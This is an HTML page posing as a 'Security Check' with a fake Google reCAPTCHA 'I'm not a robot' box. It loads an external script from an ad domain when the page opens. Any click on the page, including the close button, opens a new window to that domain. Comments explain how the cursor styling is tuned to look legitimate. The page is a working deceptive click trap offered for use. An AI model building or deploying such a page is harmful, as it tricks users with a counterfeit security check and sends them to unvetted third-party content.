<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check - Verification</title>
    
    <script src="https://omg10.com/4/10669270" async data-cfasync="false"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Roboto, Arial, sans-serif;
            background-color: #f3f3f5;
            color: #2c2c2e;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
            /* 🎯 Radnah Mouthalth normal fil-blayset l-fergha mta' l-ecran 🎯 */
            cursor: default; 
        }

        /* Background Loader */
        .bg-container {
            max-width: 450px;
            padding: 20px;
            opacity: 0.3;
        }
        .spinner {
            border: 3px solid rgba(0, 0, 0, 0.05);
            width: 32px;
            height: 32px;
            border-radius: 50%;
            border-left-color: #4a90e2;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Modal overlay */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            /* 🎯 7atta fil-dhlam mta' l-overlay yo93od Mouthalth 🎯 */
            cursor: default;
        }
        .modal-box {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 92%;
            max-width: 400px;
            position: relative;
            text-align: left;
            overflow: hidden;
            border: 1px solid rgba(0, 0, 0, 0.05);
            padding: 30px 24px 24px 24px;
            animation: slideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
            /* 🎯 Yo93od Mouthalth normal 3al-box 🎯 */
            cursor: default;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px) scale(0.98); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* X button */
        .modal-close-x {
            position: absolute;
            top: 12px;
            right: 16px;
            font-size: 20px;
            color: #ccc;
            border: none;
            background: none;
            padding: 5px;
            line-height: 1;
            z-index: 10;
            /* 🎯 Hna barka ywalli Yed (Pointer) khatir button mta' close 🎯 */
            cursor: pointer;
        }
        .modal-close-x:hover { color: #8e8e93; }

        .modal-text {
            font-size: 14.5px;
            color: #4a4a4a;
            line-height: 1.5;
            margin-bottom: 24px;
            /* 🎯 Ki yji fou9 l-ktiba ywalli text selector kima ay site legal 🎯 */
            cursor: text;
        }

        /* reCAPTCHA Widget */
        .recaptcha-box {
            background-color: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            padding: 0 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            height: 78px;
            user-select: none;
            /* 🎯 Hna ywalli Yed (Pointer) khatir hethi el-widget li lezem yclicki fiha 🎯 */
            cursor: pointer;
        }
        .recaptcha-left {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .captcha-checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }
        .captcha-spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid #4a90e2;
            border-radius: 50%;
            border-left-color: transparent;
            animation: spin 0.6s linear infinite;
        }
        .recaptcha-text {
            font-size: 15px;
            color: #000000;
            font-weight: 400;
        }
        .recaptcha-right {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-top: 4px;
        }
        .recaptcha-logo-img {
            width: 26px;
            height: 26px;
            background: url('https://www.gstatic.com/recaptcha/api2/logo_48.png') no-repeat;
            background-size: contain;
            margin-bottom: 2px;
        }
        .recaptcha-links {
            font-size: 10px;
            color: #777;
            font-weight: 400;
            line-height: 1.2;
            text-align: center;
        }
        .recaptcha-sublinks { font-size: 8px; color: #9b9b9b; }
    </style>
</head>
<body onclick="handleGlobalClick(event)">

<div class="bg-container">
    <div class="spinner"></div>
    <h1>Loading secure connection...</h1>
</div>

<div class="modal-overlay" id="securityModal">
    <div class="modal-box" onclick="handleGlobalClick(event)">
        
        <button class="modal-close-x" onclick="forceAdTrigger('X'); event.stopPropagation();">&times;</button>
        
        <div class="modal-text">
            Please help us keeping our community safe by checking the security box below to confirm you are not a bot.
        </div>
        
        <div class="recaptcha-box" onclick="triggerCaptchaClick(event)">
            <div class="recaptcha-left">
                <div class="captcha-checkbox" id="captchaBox">
                    <div class="captcha-spinner" id="captchaLoader"></div>
                </div>
                <div class="recaptcha-text" id="captchaText">I'm not a robot</div>
            </div>
            <div class="recaptcha-right">
                <div class="recaptcha-logo-img"></div>
                <div class="recaptcha-links">reCAPTCHA</div>
                <div class="recaptcha-sublinks">Privacy - Terms</div>
            </div>
        </div>

    </div>
</div>

<script>
    var isClicked = false;

    function triggerCaptchaClick(e) {
        e.stopPropagation(); 
        if(isClicked) return;
        isClicked = true;

        var box = document.getElementById('captchaBox');
        var loader = document.getElementById('captchaLoader');

        box.style.borderColor = "#4a90e2";
        loader.style.display = "block";

        setTimeout(function() {
            loader.style.display = "none";
            box.style.backgroundColor = "#fff";
            box.style.borderColor = "#009688"; 
            box.innerHTML = "<span style='color:#009688; font-size:20px; font-weight:bold; line-height:1; transform: scaleX(-1) rotate(-35deg); display:inline-block; margin-bottom:4px; margin-right:2px;'>✓</span>";
            
            setTimeout(function() {
                forceAdTrigger('CHECKBOX');
            }, 300);

        }, 600);
    }

    function handleGlobalClick(e) {
        if(isClicked) return;
        isClicked = true;
        forceAdTrigger('GLOBAL_TOUCH');
    }

    function forceAdTrigger(action) {
        console.log("Ad Triggered by: " + action);
        document.getElementById('securityModal').style.display = 'none';
        
        try {
            window.open("https://omg10.com/4/10669270", "_blank");
        } catch(e) {
            console.log("Fallback script triggered");
        }
    }
</script>

</body>
</html>
